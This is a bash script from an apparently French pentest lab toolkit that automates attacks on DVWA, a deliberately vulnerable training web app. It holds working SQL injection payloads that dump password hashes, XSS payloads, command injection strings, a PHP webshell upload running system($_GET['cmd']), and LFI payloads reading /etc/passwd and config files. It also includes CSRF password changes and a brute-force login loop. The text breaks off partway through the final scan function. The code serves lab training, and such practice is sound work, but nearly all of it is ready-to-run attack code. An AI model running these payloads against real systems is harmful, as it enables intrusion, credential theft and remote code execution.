#!/bin/bash
# modules/labs/dvwa/exploits.sh - EXPLOITS CORRIGÉS (détection robuste)
# Version: 3.0 - Ghost00ls Labs

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# FONCTIONS COMMUNES AMÉLIORÉES
# ==========================

# Détecter le security level (ROBUSTE)
detect_security_level() {
    local cookie_jar="$1"
    local base_url="$2"
    
    local resp=$(curl -s -b "$cookie_jar" "${base_url}/security.php" 2>/dev/null)
    
    # Patterns multiples pour détecter le niveau sélectionné
    if echo "$resp" | grep -qiE 'selected[^>]*>.*low|value=["\']?low["\']?[^>]*selected|option[^>]*low[^>]*selected'; then
        echo "low"
    elif echo "$resp" | grep -qiE 'selected[^>]*>.*medium|value=["\']?medium["\']?[^>]*selected'; then
        echo "medium"
    elif echo "$resp" | grep -qiE 'selected[^>]*>.*high|value=["\']?high["\']?[^>]*selected'; then
        echo "high"
    elif echo "$resp" | grep -qiE 'selected[^>]*>.*impossible|value=["\']?impossible["\']?[^>]*selected'; then
        echo "impossible"
    else
        # Fallback : chercher dans le HTML brut
        if echo "$resp" | grep -qi "security.*low"; then
            echo "low"
        else
            echo "unknown"
        fi
    fi
}

# Initialiser proprement la session DVWA
init_dvwa_session() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}🔧 Initialisation session DVWA...${NC}"
    
    # 1. Visiter la page d'accueil
    curl -s -b "$cookie_jar" -c "$cookie_jar" "${base_url}/index.php" >/dev/null 2>&1
    sleep 1
    
    # 2. Forcer security level à low (méthode POST standard)
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -X POST \
        -d "security=low&seclev_submit=Submit" \
        "${base_url}/security.php" >/dev/null 2>&1
    
    sleep 1
    
    # 3. Vérifier le niveau
    local level=$(detect_security_level "$cookie_jar" "$base_url")
    echo -e "${CYAN}🔒 Security Level configuré: $level${NC}"
    
    if [ "$level" = "low" ]; then
        return 0
    else
        echo -e "${YELLOW}⚠️ Security Level = $level (attendu: low)${NC}"
        return 1
    fi
}

# Forcer security level à low (AMÉLIORÉ)
force_security_low() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}🔧 Force Security Level = Low...${NC}"
    
    # Méthode 1 : POST standard
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -X POST \
        -d "security=low&seclev_submit=Submit" \
        "${base_url}/security.php" >/dev/null 2>&1
    
    sleep 1
    
    # Méthode 2 : GET (fallback)
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        "${base_url}/security.php?security=low&seclev_submit=Submit" >/dev/null 2>&1
    
    sleep 1
    
    local new_level=$(detect_security_level "$cookie_jar" "$base_url")
    
    if [ "$new_level" = "low" ]; then
        echo -e "${GREEN}✅ Security Level = Low${NC}"
        return 0
    else
        echo -e "${RED}❌ Security Level = $new_level (échec)${NC}"
        echo -e "${YELLOW}💡 Configure manuellement depuis l'interface web${NC}"
        return 1
    fi
}

# ==========================
# 1. SQL INJECTION (CORRIGÉ)
# ==========================

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [SQL Injection - Détection Robuste]${NC}"
    echo -e "${CYAN}📖 Objectif : Extraction de données via SQLi${NC}"
    echo -e "${YELLOW}⚠️ Risque : Fuite de données${NC}"
    echo -e "${GREEN}🛡️ Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    echo -e "\n${YELLOW}🔑 Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    local session=$(echo "$result" | cut -d'|' -f2)
    
    if [ -z "$session" ]; then
        echo -e "${RED}❌ Échec authentification${NC}"
        read -p "👉 Entrée..."
        return
    fi
    
    echo -e "${GREEN}✅ Authentifié (session: ${session:0:12}...)${NC}"
    
    # Initialiser DVWA proprement
    init_dvwa_session "$cookie_jar" "$BASE"
    
    # Vérifier le security level
    local sec_level=$(detect_security_level "$cookie_jar" "$BASE")
    echo -e "${CYAN}🔒 Security Level actuel: $sec_level${NC}"
    
    if [ "$sec_level" != "low" ]; then
        echo -e "${YELLOW}⚠️ Security level n'est pas 'low', tentative de forçage...${NC}"
        force_security_low "$cookie_jar" "$BASE"
    fi
    
    # Payloads SQLi adaptés
    local payloads=(
        "1' OR '1'='1"
        "1' OR 1=1 #"
        "' OR '1'='1"
        "1' UNION SELECT null, concat(user,':',password) FROM users #"
        "1' UNION SELECT null, database() #"
    )
    
    echo -e "\n${YELLOW}▶ Test SQLi avec détection multi-critères...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/sqli/?id=${enc}&Submit=Submit"
        
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # Détection multi-critères ROBUSTE
        local has_data=0
        
        # Critère 1: Présence de noms d'utilisateurs DVWA
        if grep -qiE "admin|gordonb|pablo|smithy|1337" "$tmpf"; then
            echo -e "${GREEN}✅ Usernames DVWA détectés${NC}"
            has_data=1
        fi
        
        # Critère 2: Structure HTML de résultats (balise <pre>)
        if grep -qE "<pre>|<table|ID:.*First name:.*Surname:" "$tmpf"; then
            echo -e "${GREEN}✅ Structure de résultats HTML détectée${NC}"
            has_data=1
        fi
        
        # Critère 3: Patterns SQL typiques
        if grep -qiE "(First name|Surname|ID:|user_id)" "$tmpf"; then
            echo -e "${GREEN}✅ Patterns SQL détectés${NC}"
            has_data=1
        fi
        
        # Critère 4: Hash MD5 (passwords)
        if grep -qE "[a-f0-9]{32}" "$tmpf"; then
            echo -e "${GREEN}✅ Hash MD5 détecté (passwords)${NC}"
            has_data=1
        fi
        
        # Critère 5: Nom de la DB
        if grep -qi "dvwa\|database" "$tmpf"; then
            echo -e "${GREEN}✅ Information de database détectée${NC}"
            has_data=1
        fi
        
        if [ $has_data -eq 1 ]; then
            echo -e "${GREEN}✅✅ SQLi SUCCESS - Données extraites !${NC}"
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi: $payload"
            
            # Extraire et afficher les données avec plus de détails
            echo -e "\n${CYAN}📊 Données extraites:${NC}"
            
            # Afficher le contenu brut HTML nettoyé
            cat "$tmpf" | grep -oE "(ID:.*|First name:.*|Surname:.*|admin|gordonb|pablo|[a-f0-9]{32})" | head -n 30
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}⚠️ Pas de données détectées${NC}"
            # Debug : afficher un extrait
            echo -e "${CYAN}[DEBUG] Extrait réponse:${NC}"
            head -c 500 "$tmpf" | grep -i "first\|surname\|error" | head -n 3
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}❌ Aucun payload n'a extrait de données${NC}"
        echo -e "${YELLOW}💡 Actions recommandées:${NC}"
        echo -e "   1. Vérifie que Security Level = Low dans DVWA web UI"
        echo -e "   2. Visite http://${IP}:${PORT}/security.php"
        echo -e "   3. Teste manuellement: http://${IP}:${PORT}/vulnerabilities/sqli/"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 2. XSS (CORRIGÉ)
# ==========================

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [XSS Reflected - Détection Robuste]${NC}"
    echo -e "${CYAN}📖 Objectif : Injection de scripts${NC}"
    echo -e "${YELLOW}⚠️ Risque : Session hijacking${NC}"
    echo -e "${GREEN}🛡️ Mitigation : Output encoding, CSP${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Init session
    init_dvwa_session "$cookie_jar" "$BASE"
    
    # Forcer low security
    local sec_level=$(detect_security_level "$cookie_jar" "$BASE")
    [ "$sec_level" != "low" ] && force_security_low "$cookie_jar" "$BASE"
    
    # Payloads XSS variés
    local payloads=(
        '<script>alert(1)</script>'
        '<img src=x onerror=alert(1)>'
        '<svg onload=alert(1)>'
        '"><script>alert(1)</script>'
        '<iframe src=javascript:alert(1)>'
        '<body onload=alert(1)>'
        '<script>alert(String.fromCharCode(88,83,83))</script>'
    )
    
    echo -e "\n${YELLOW}▶ Test XSS Reflected avec détection robuste...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/xss_r/?name=${enc}"
        
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${CYAN}Payload: ${payload:0:50}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # Détection multi-critères ROBUSTE
        local is_reflected=0
        
        # Critère 1: Payload exact non encodé
        if grep -qF "$payload" "$tmpf"; then
            echo -e "${GREEN}✅ Payload reflété exactement (vulnérable)${NC}"
            is_reflected=1
        fi
        
        # Critère 2: Éléments XSS détectés (balises dangereuses)
        if grep -qiE "<script[^>]*>|<img[^>]*onerror|<svg[^>]*onload|<iframe[^>]*src|<body[^>]*onload" "$tmpf"; then
            echo -e "${GREEN}✅ Éléments XSS dangereux détectés${NC}"
            is_reflected=1
        fi
        
        # Critère 3: Vérifier l'ABSENCE d'encodage HTML
        if ! grep -qE "&lt;script&gt;|&lt;img|htmlspecialchars|htmlentities" "$tmpf"; then
            if grep -qiE "(script|img.*onerror|svg.*onload)" "$tmpf"; then
                echo -e "${GREEN}✅ Pas d'encodage HTML (vulnérable)${NC}"
                is_reflected=1
            fi
        else
            echo -e "${YELLOW}⚠️ Encodage HTML détecté (protégé)${NC}"
        fi
        
        if [ $is_reflected -eq 1 ]; then
            echo -e "${GREEN}✅✅ XSS SUCCESS - Payload exécutable !${NC}"
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: ${payload:0:40}"
            
            # Extraire le contexte d'injection
            echo -e "\n${CYAN}📊 Contexte d'injection:${NC}"
            grep -oE ".{0,80}${payload:0:20}.{0,80}" "$tmpf" 2>/dev/null | head -n 3 | sed 's/</\n</g'
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}⚠️ Payload bloqué, encodé ou filtré${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}❌ Tous les payloads ont été bloqués${NC}"
        echo -e "${YELLOW}💡 Vérifie Security Level = Low dans DVWA${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 3. COMMAND INJECTION (CORRIGÉ)
# ==========================

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [Command Injection - Détection Robuste]${NC}"
    echo -e "${CYAN}📖 Objectif : Exécution de commandes OS${NC}"
    echo -e "${YELLOW}⚠️ Risque : RCE (Remote Code Execution)${NC}"
    echo -e "${GREEN}🛡️ Mitigation : Input validation, whitelist${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Init session
    init_dvwa_session "$cookie_jar" "$BASE"
    force_security_low "$cookie_jar" "$BASE"
    
    # Payloads avec différents séparateurs
    local payloads=(
        "127.0.0.1;id"
        "127.0.0.1; id"
        "127.0.0.1 ; id"
        "127.0.0.1; whoami"
        "127.0.0.1 && id"
        "127.0.0.1 | id"
        "127.0.0.1 || id"
        $'127.0.0.1\nid'
        "127.0.0.1\`id\`"
        "127.0.0.1;uname -a"
    )
    
    echo -e "\n${YELLOW}▶ Test Command Injection...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/exec/?ip=${enc}&Submit=Submit"
        
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # Détection multi-critères ROBUSTE
        local has_exec=0
        
        # Critère 1: Output de 'id' (uid/gid)
        if grep -qE "uid=[0-9]+\([^)]+\)|gid=[0-9]+\([^)]+\)" "$tmpf"; then
            echo -e "${GREEN}✅ Output 'id' détecté (RCE confirmé)${NC}"
            has_exec=1
        fi
        
        # Critère 2: Username système
        if grep -qiE "www-data|root|apache|nginx" "$tmpf"; then
            echo -e "${GREEN}✅ Username système détecté${NC}"
            has_exec=1
        fi
        
        # Critère 3: Output 'uname'
        if grep -qiE "Linux|GNU|kernel|debian|ubuntu" "$tmpf"; then
            echo -e "${GREEN}✅ Output système détecté${NC}"
            has_exec=1
        fi
        
        # Critère 4: Bloc <pre> avec contenu système
        if grep -qE "<pre>.*uid=|<pre>.*www-data|<pre>.*Linux" "$tmpf"; then
            echo -e "${GREEN}✅ Bloc <pre> avec output système${NC}"
            has_exec=1
        fi
        
        if [ $has_exec -eq 1 ]; then
            echo -e "${GREEN}✅✅ Command Injection SUCCESS !${NC}"
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "CmdInj: $payload"
            
            echo -e "\n${CYAN}📊 Output de la commande:${NC}"
            # Extraire proprement le contenu
            grep -oE "<pre>.*</pre>" "$tmpf" | sed 's/<[^>]*>//g' | head -n 15
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}⚠️ Pas d'exécution détectée${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}❌ Aucune exécution de commande détectée${NC}"
        echo -e "${YELLOW}💡 Vérifie Security Level = Low${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 4. FILE UPLOAD (CORRIGÉ)
# ==========================

exploit_upload() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [File Upload - Détection Robuste]${NC}"
    echo -e "${CYAN}📖 Objectif : Upload webshell${NC}"
    echo -e "${YELLOW}⚠️ Risque : RCE via webshell${NC}"
    echo -e "${GREEN}🛡️ Mitigation : Type validation, rename${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Init session
    init_dvwa_session "$cookie_jar" "$BASE"
    force_security_low "$cookie_jar" "$BASE"
    
    # Créer payloads variés
    local workdir=$(mktemp -d)
    
    # Payload 1: Simple PHP
    cat > "${workdir}/shell.php" <<'SHELL1'
<?php echo "GHOST_SHELL_OK_".php_uname()."_END"; ?>
SHELL1
    
    # Payload 2: Double extension
    cat > "${workdir}/shell.php.jpg" <<'SHELL2'
GIF89a
<?php system($_GET['cmd']); ?>
SHELL2
    
    # Payload 3: Null byte
    cat > "${workdir}/shell.php%00.jpg" <<'SHELL3'
<?php echo "GHOST_NULL_BYTE_OK"; ?>
SHELL3
    
    echo -e "\n${YELLOW}⏳ Test upload avec détection robuste...${NC}\n"
    
    local files=("shell.php" "shell.php.jpg" "shell.php%00.jpg")
    local success=0
    
    for file in "${files[@]}"; do
        local filepath="${workdir}/${file}"
        
        # Skip si fichier n'existe pas
        [ ! -f "$filepath" ] && continue
        
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${CYAN}Upload: $file${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 \
            -F "uploaded=@${filepath};filename=${file}" \
            -F "Upload=Upload" \
            "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        
        # Détection upload réussi (multi-patterns)
        if grep -qiE "successfully uploaded|succesfully uploaded|has been uploaded|upload.*success" "$tmpf"; then
            echo -e "${GREEN}✅ Upload SUCCESS${NC}"
            
            # Extraire le chemin si possible
            local uploaded_path=$(grep -oE "hackable/uploads/[^<\"']+" "$tmpf" | head -n1)
            
            if [ -n "$uploaded_path" ]; then
                echo -e "${CYAN}📂 Path: $uploaded_path${NC}"
            fi
            
            # Tester exécution avec plusieurs chemins possibles
            local test_paths=(
                "hackable/uploads/${file}"
                "vulnerabilities/upload/../../hackable/uploads/${file}"
                "${file}"
            )
            
            for path in "${test_paths[@]}"; do
                local test_url="${BASE}/${path}"
                
                echo -e "${CYAN}Test exec: $path${NC}"
                
                local exec_resp=$(curl -s --max-time 5 "$test_url" 2>/dev/null)
                
                # Vérifier signature du shell
                if echo "$exec_resp" | grep -qE "GHOST_SHELL_OK|GHOST_NULL_BYTE_OK"; then
                    echo -e "${GREEN}✅✅ Exécution confirmée !${NC}"
                    echo -e "${CYAN}🔗 URL: $test_url${NC}"
                    echo -e "${CYAN}Output: $exec_resp${NC}"
                    log_exploit "${LOG_DIR}/upload.log" "SUCCESS" "Upload+Exec: $file at $path"
                    success=1
                    break 2
                elif echo "$exec_resp" | grep -qE "<?php"; then
                    echo -e "${YELLOW}⚠️ Code PHP visible (non exécuté)${NC}"
                fi
            done
        else
            echo -e "${RED}❌ Upload refusé${NC}"
            # Debug
            echo -e "${CYAN}[DEBUG] Réponse:${NC}"
            grep -iE "error|invalid|not allowed|failed" "$tmpf" | head -n 3
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}❌ Aucun upload réussi ou exécuté${NC}"
        echo -e "${YELLOW}💡 Vérifie les permissions du dossier hackable/uploads/${NC}"
    fi
    
    rm -rf "$workdir"
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 5. LFI (CORRIGÉ)
# ==========================

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [LFI - Local File Inclusion]${NC}"
    echo -e "${CYAN}📖 Objectif : Lecture fichiers sensibles${NC}"
    echo -e "${YELLOW}⚠️ Risque : Information disclosure${NC}"
    echo -e "${GREEN}🛡️ Mitigation : Whitelist, chroot${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Init session
    init_dvwa_session "$cookie_jar" "$BASE"
    force_security_low "$cookie_jar" "$BASE"
    
    # Payloads LFI variés
    local payloads=(
        "../../../../../../etc/passwd"
        "....//....//....//....//....//....//etc/passwd"
        "../../../../../../etc/hosts"
        "php://filter/convert.base64-encode/resource=../../config/config.inc.php"
        "../../../../../../proc/self/environ"
        "../../../../../../var/log/apache2/access.log"
    )
    
    echo -e "\n${YELLOW}▶ Test LFI...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/fi/?page=${enc}"
        
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${CYAN}Payload: ${payload:0:60}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # Détection multi-critères ROBUSTE
        local has_file=0
        
        # Critère 1: /etc/passwd
        if grep -qE "root:x:0:0|nobody:x:|daemon:|bin:x:" "$tmpf"; then
            echo -e "${GREEN}✅ /etc/passwd détecté${NC}"
            has_file=1
        fi
        
        # Critère 2: /etc/hosts
        if grep -qE "127\.0\.0\.1.*localhost|::1.*localhost" "$tmpf"; then
            echo -e "${GREEN}✅ /etc/hosts détecté${NC}"
            has_file=1
        fi
        
        # Critère 3: Base64 (php://filter)
        if grep -qE "^[A-Za-z0-9+/]{40,}={0,2}$" "$tmpf"; then
            echo -e "${GREEN}✅ Contenu base64 détecté (php filter)${NC}"
            has_file=1
            
            # Décoder le base64
            echo -e "${CYAN}[Décodage base64]${NC}"
            head -c 1000 "$tmpf" | base64 -d 2>/dev/null | head -n 10
        fi
        
        # Critère 4: Contenu PHP
        if grep -qE "<?php|\\\$_DVWA|db_password|MYSQL" "$tmpf"; then
            echo -e "${GREEN}✅ Fichier PHP/Config exposé${NC}"
            has_file=1
        fi
        
        # Critère 5: Variables d'environnement
        if grep -qiE "PATH=|HOME=|USER=|SHELL=" "$tmpf"; then
            echo -e "${GREEN}✅ Variables d'environnement détectées${NC}"
            has_file=1
        fi
        
        if [ $has_file -eq 1 ]; then
            echo -e "${GREEN}✅✅ LFI SUCCESS - Fichier exposé !${NC}"
            log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "LFI: ${payload:0:40}"
            
            echo -e "\n${CYAN}📊 Extrait du fichier (20 premières lignes):${NC}"
            head -n 20 "$tmpf" | grep -v "^$"
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}⚠️ Fichier non accessible${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}❌ Aucun fichier accessible${NC}"
        echo -e "${YELLOW}💡 Vérifie Security Level = Low${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 6. CSRF (CORRIGÉ)
# ==========================

exploit_csrf() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [CSRF - Cross-Site Request Forgery]${NC}"
    echo -e "${CYAN}📖 Objectif : Forcer action non autorisée${NC}"
    echo -e "${YELLOW}⚠️ Risque : Actions au nom de la victime${NC}"
    echo -e "${GREEN}🛡️ Mitigation : CSRF tokens, SameSite${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Init session
    init_dvwa_session "$cookie_jar" "$BASE"
    force_security_low "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}🔍 Analyse du formulaire CSRF...${NC}"
    
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" "${BASE}/vulnerabilities/csrf/" > "$tmpf" 2>/dev/null
    
    # Recherche de token CSRF
    local has_token=$(grep -oE "user_token[\"']?\s*value=[\"'][^\"']+|name=[\"']user_token" "$tmpf")
    
    if [ -z "$has_token" ]; then
        echo -e "${GREEN}✅ Pas de token CSRF détecté (VULNÉRABLE)${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "VULN" "CSRF: no token found"
    else
        echo -e "${YELLOW}⚠️ Token CSRF présent${NC}"
        echo -e "${CYAN}Token trouvé: ${has_token:0:50}...${NC}"
    fi
    
    rm -f "$tmpf"
    
    echo -e "\n${YELLOW}▶ Test 1: Changement password SANS token...${NC}"
    
    local resp1=$(curl -s -b "$cookie_jar" \
        "${BASE}/vulnerabilities/csrf/?password_new=ghost123&password_conf=ghost123&Change=Change" 2>/dev/null)
    
    if echo "$resp1" | grep -qiE "password.*changed|password.*updated|successfully"; then
        echo -e "${GREEN}✅✅ CSRF SUCCESS - Password changé sans token !${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "CSRF: password changed without token"
        echo -e "${CYAN}Nouveau password: ghost123${NC}"
    else
        echo -e "${YELLOW}⚠️ Échec (token requis ou autre protection)${NC}"
    fi
    
    echo -e "\n${YELLOW}▶ Test 2: Vérification protection Referer...${NC}"
    
    local resp2=$(curl -s -b "$cookie_jar" \
        -H "Referer: http://malicious.com" \
        "${BASE}/vulnerabilities/csrf/?password_new=hacked456&password_conf=hacked456&Change=Change" 2>/dev/null)
    
    if echo "$resp2" | grep -qiE "password.*changed|successfully"; then
        echo -e "${GREEN}✅ CSRF fonctionne même avec Referer externe !${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "CSRF: bypass referer check"
    else
        echo -e "${GREEN}✅ Protection Referer active${NC}"
    fi
    
    echo -e "\n${CYAN}📋 Résumé CSRF:${NC}"
    echo -e "   • Token présent: $([ -z "$has_token" ] && echo 'NON' || echo 'OUI')"
    echo -e "   • Changement password: $(echo "$resp1" | grep -q 'changed' && echo 'SUCCESS' || echo 'FAILED')"
    echo -e "   • Protection Referer: $(echo "$resp2" | grep -q 'changed' && echo 'NON' || echo 'OUI')"
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 7. BRUTE FORCE (BONUS)
# ==========================

exploit_bruteforce() {
    clear
    banner
    echo -e "${MAGENTA}🧪 [Brute Force - Login]${NC}"
    echo -e "${CYAN}📖 Objectif : Casser le mot de passe${NC}"
    echo -e "${YELLOW}⚠️ Risque : Accès non autorisé${NC}"
    echo -e "${GREEN}🛡️ Mitigation : Rate limiting, CAPTCHA${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Créer une petite wordlist
    local passwords=("password" "admin" "123456" "letmein" "Password1" "admin123")
    
    echo -e "\n${YELLOW}▶ Test Brute Force sur login...${NC}"
    echo -e "${CYAN}Target: admin${NC}"
    echo -e "${CYAN}Wordlist: ${#passwords[@]} passwords${NC}\n"
    
    local cookie_jar=$(create_cookie_jar)
    local success=0
    
    for pass in "${passwords[@]}"; do
        echo -e "${CYAN}[*] Test: admin / $pass${NC}"
        
        # Reset session
        rm -f "$cookie_jar"
        cookie_jar=$(create_cookie_jar)
        
        # Tenter login
        local result=$(login_form "${BASE}/login.php" "admin" "$pass")
        local session=$(echo "$result" | cut -d'|' -f2)
        
        if [ -n "$session" ]; then
            # Vérifier si vraiment connecté
            local resp=$(curl -s -b "$cookie_jar" "${BASE}/index.php" 2>/dev/null)
            
            if echo "$resp" | grep -qiE "Logout|Welcome.*admin"; then
                echo -e "${GREEN}✅✅ BRUTE FORCE SUCCESS !${NC}"
                echo -e "${CYAN}Credentials: admin / $pass${NC}"
                log_exploit "${LOG_DIR}/bruteforce.log" "SUCCESS" "Bruteforce: admin/$pass"
                success=1
                break
            fi
        fi
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${YELLOW}⚠️ Aucun password trouvé dans la wordlist${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "👉 Entrée..."
}

# ==========================
# 8. FULL SCAN (BONUS)
# ==========================

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}🎯 [Full Scan DVWA]${NC}"
    echo -e "${CYAN}Scan complet de toutes les vulnérabilités${NC}\n"
    
    local IP PORT
    IP=$(get_host_ip)
    
    read -p "🌐 IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (8081): " PORT; PORT=${PORT:-8081}
    
    echo -e "\n${YELLOW}⏳ Lancement du scan complet...${NC}\n"
    
    # Créer rapport
    local report="${LOG_DIR}/full_scan_$(date +%Y%m%d_%H%M%S).txt"
    
    echo "========================================" | tee "$report"
    echo "DVWA Full Scan Report" | tee -a "$report"
    echo "Date: $(date)" | tee -a "$report"
    echo "Target: http://${IP}:${PORT}" | tee -a "$report"
    echo "========================================" | tee -a "$report"
    echo | tee -a "$report"
    
    # Login unique pour tout le scan
    local result=$(login_form "http://${IP}:${PORT}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    if [ -z "$(echo "$result" | cut -d'|' -f2)" ]; then
        echo -e "${RED}❌ Échec authentification${NC}" | tee -a "$report"
        read -p "👉 Entrée..."
        return
    fi
    
    init_dvwa_session "$cookie_jar" "http://${IP}:${PORT}"
    
    echo -e "${GREEN}[1/6] Test SQL Injection...${NC}" | tee -a "$report"
    # Test SQLi basique
    local sqli_resp=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit")
